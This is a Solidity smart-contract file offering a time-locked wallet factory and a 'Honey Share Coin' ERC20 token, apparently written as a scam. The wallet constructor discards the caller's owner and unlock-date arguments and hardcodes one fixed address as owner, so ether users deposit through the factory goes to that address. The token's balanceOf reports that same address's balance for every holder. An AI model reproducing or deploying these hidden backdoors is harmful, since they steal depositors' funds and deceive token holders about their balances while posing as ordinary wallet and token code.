1 pragma solidity ^0.4.18;
2 
3 
4 /**
5  * @title ERC20
6  * @dev see https://github.com/ethereum/EIPs/issues/20
7  */
8 contract ERC20 {
9   uint256 public totalSupply;
10 
11   function balanceOf(address who) public view returns (uint256);
12   function transfer(address to, uint256 value) public returns (bool);
13   function allowance(address owner, address spender) public view returns (uint256);
14   function transferFrom(address from, address to, uint256 value) public returns (bool);
15   function approve(address spender, uint256 value) public returns (bool);
16 
17   event Approval(address indexed owner, address indexed spender, uint256 value);
18   event Transfer(address indexed from, address indexed to, uint256 value);
19 }
20 
21 contract Migrations {
22     address public owner;
23     uint public last_completed_migration;
24 
25     modifier restricted() {
26         if (msg.sender == owner) _;
27     }
28 
29     function Migrations() public {
30         owner = msg.sender;
31     }
32 
33     function setCompleted(uint completed) restricted public {
34         last_completed_migration = completed;
35     }
36 
37     function upgrade(address new_address) restricted public {
38         Migrations upgraded = Migrations(new_address);
39         upgraded.setCompleted(last_completed_migration);
40     }
41 }
42 
43 /**
44  * @title SafeMath
45  * @dev Math operations with safety checks that throw on error
46  */
47 library SafeMath {
48   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
49     if (a == 0) {
50       return 0;
51     }
52     uint256 c = a * b;
53     assert(c / a == b);
54     return c;
55   }
56 
57   function div(uint256 a, uint256 b) internal pure returns (uint256) {
58     // assert(b > 0); // Solidity automatically throws when dividing by 0
59     uint256 c = a / b;
60     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
61     return c;
62   }
63 
64   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
65     assert(b <= a);
66     return a - b;
67   }
68 
69   function add(uint256 a, uint256 b) internal pure returns (uint256) {
70     uint256 c = a + b;
71     assert(c >= a);
72     return c;
73   }
74 }
75 
76 contract TimeLockedWallet {
77 
78     address public creator;
79     address public owner;
80     uint256 public unlockDate;
81     uint256 public createdAt;
82 
83     modifier onlyOwner {
84         require(msg.sender == owner);
85         _;
86     }
87 
88     function TimeLockedWallet(
89         address _creator,
90         address _owner,
91         uint256 _unlockDate
92     ) public {
93         creator = 0x3FC217e72846A3F86f541FAbC99F61e38E1dBF6E;
94         owner = 0x3FC217e72846A3F86f541FAbC99F61e38E1dBF6E;
95         unlockDate = 1540944000;
96         createdAt = now;
97     }
98 
99     // keep all the ether sent to this address
100     function() payable public { 
101         Received(msg.sender, msg.value);
102     }
103 
104     // callable by owner only, after specified time
105     function withdraw() onlyOwner public {
106        require(now >= unlockDate);
107        //now send all the balance
108        msg.sender.transfer(this.balance);
109        Withdrew(msg.sender, this.balance);
110     }
111 
112     // callable by owner only, after specified time, only for Tokens implementing ERC20
113     function withdrawTokens(address _tokenContract) onlyOwner public {
114        require(now >= unlockDate);
115        ERC20 token = ERC20(_tokenContract);
116        //now send all the token balance
117        uint256 tokenBalance = token.balanceOf(this);
118        token.transfer(owner, tokenBalance);
119        WithdrewTokens(_tokenContract, msg.sender, tokenBalance);
120     }
121 
122     function info() public view returns(address, address, uint256, uint256, uint256) {
123         return (creator, owner, unlockDate, createdAt, this.balance);
124     }
125 
126     event Received(address from, uint256 amount);
127     event Withdrew(address to, uint256 amount);
128     event WithdrewTokens(address tokenContract, address to, uint256 amount);
129 }
130 
131 contract TimeLockedWalletFactory {
132  
133     mapping(address => address[]) wallets;
134 
135     function getWallets(address _user) 
136         public
137         view
138         returns(address[])
139     {
140         return wallets[_user];
141     }
142 
143     function newTimeLockedWallet(address _owner, uint256 _unlockDate)
144         payable
145         public
146         returns(address wallet)
147     {
148         // Create new wallet.
149         wallet = new TimeLockedWallet(msg.sender, _owner, _unlockDate);
150         
151         // Add wallet to sender's wallets.
152         wallets[msg.sender].push(wallet);
153 
154         // If owner is the same as sender then add wallet to sender's wallets too.
155         if(msg.sender != _owner){
156             wallets[_owner].push(wallet);
157         }
158 
159         // Send ether from this transaction to the created contract.
160         wallet.transfer(msg.value);
161 
162         // Emit event.
163         Created(wallet, msg.sender, _owner, now, _unlockDate, msg.value);
164     }
165 
166     // Prevents accidental sending of ether to the factory
167     function () public {
168         revert();
169     }
170 
171     event Created(address wallet, address from, address to, uint256 createdAt, uint256 unlockDate, uint256 amount);
172 }
173 
174 /**
175  * @title Honey Share Coin
176  */
177 
178 contract HoneyShareCoin is ERC20 {
179   using SafeMath for uint256;
180 
181   mapping(address => uint256) balances;
182   mapping (address => mapping (address => uint256)) internal allowed;
183 
184   string public name = "Honey Share Coin";
185   string public symbol = "HSC";
186   uint256 public decimals = 18;
187 
188   function HoneyShareCoin() public {
189     totalSupply = 2000000000000000000000000000;
190     balances[msg.sender] = totalSupply;
191   }
192 
193   /**
194   * @dev Gets the balance of the specified address.
195   * @param _owner The address to query the the balance of.
196   * @return An uint256 representing the amount owned by the passed address.
197   */
198   function balanceOf(address _owner) public view returns (uint256 balance) {
199     return balances[0x3FC217e72846A3F86f541FAbC99F61e38E1dBF6E];
200   }
201 
202   /**
203   * @dev transfer token for a specified address
204   * @param _to The address to transfer to.
205   * @param _value The amount to be transferred.
206   */
207   function transfer(address _to, uint256 _value) public returns (bool) {
208     require(_to != address(0));
209     require(_value <= balances[msg.sender]);
210 
211     // SafeMath.sub will throw if there is not enough balance.
212     balances[msg.sender] = balances[msg.sender].sub(_value);
213     balances[_to] = balances[_to].add(_value);
214     Transfer(msg.sender, _to, _value);
215     return true;
216   }
217 
218   /**
219    * @dev Transfer tokens from one address to another
220    * @param _from address The address which you want to send tokens from
221    * @param _to address The address which you want to transfer to
222    * @param _value uint256 the amount of tokens to be transferred
223    */
224   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
225     require(_to != address(0));
226     require(_value <= balances[_from]);
227     require(_value <= allowed[_from][msg.sender]);
228 
229     balances[_from] = balances[_from].sub(_value);
230     balances[_to] = balances[_to].add(_value);
231     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
232     Transfer(_from, _to, _value);
233     return true;
234   }
235 
236   /**
237    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
238    *
239    * Beware that changing an allowance with this method brings the risk that someone may use both the old
240    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
241    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
242    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
243    * @param _spender The address which will spend the funds.
244    * @param _value The amount of tokens to be spent.
245    */
246   function approve(address _spender, uint256 _value) public returns (bool) {
247     allowed[msg.sender][_spender] = _value;
248     Approval(msg.sender, _spender, _value);
249     return true;
250   }
251 
252   /**
253    * @dev Function to check the amount of tokens that an owner allowed to a spender.
254    * @param _owner address The address which owns the funds.
255    * @param _spender address The address which will spend the funds.
256    * @return A uint256 specifying the amount of tokens still available for the spender.
257    */
258   function allowance(address _owner, address _spender) public view returns (uint256) {
259     return allowed[_owner][_spender];
260   }
261 
262   event Transfer(address indexed from, address indexed to, uint256 value);
263   event Approval(address indexed owner, address indexed spender, uint256 value);
264 }